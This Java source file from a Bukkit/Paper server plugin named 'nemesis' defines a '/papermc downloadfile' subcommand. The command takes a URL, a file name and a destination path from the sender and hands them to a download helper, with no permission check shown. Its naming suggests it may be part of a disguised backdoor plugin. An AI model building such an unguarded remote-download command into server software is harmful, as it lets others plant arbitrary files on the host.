package dev.minhh2792.nemesis.commands.subcommands;

import org.bukkit.command.CommandSender;

import dev.minhh2792.nemesis.Utils;
import dev.minhh2792.nemesis.commands.SubCommand;

public class DownloadFile implements SubCommand {

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (args.length == 1) {
            sender.sendMessage("&cUsage: /papermc downloadfile <url> <file> <path>");
            return;
        }

        if (args.length == 2) {
            sender.sendMessage("&cPlease specify a file!");
            return;
        }

        if (args.length == 3) {
            sender.sendMessage("&cPlease specify a path!");
            return;
        }

        Utils.downloadFile(sender, args[1], args[2], args[3]);
    }

    @Override
    public String getName() {
        return "DownloadFile";
    }
    
}
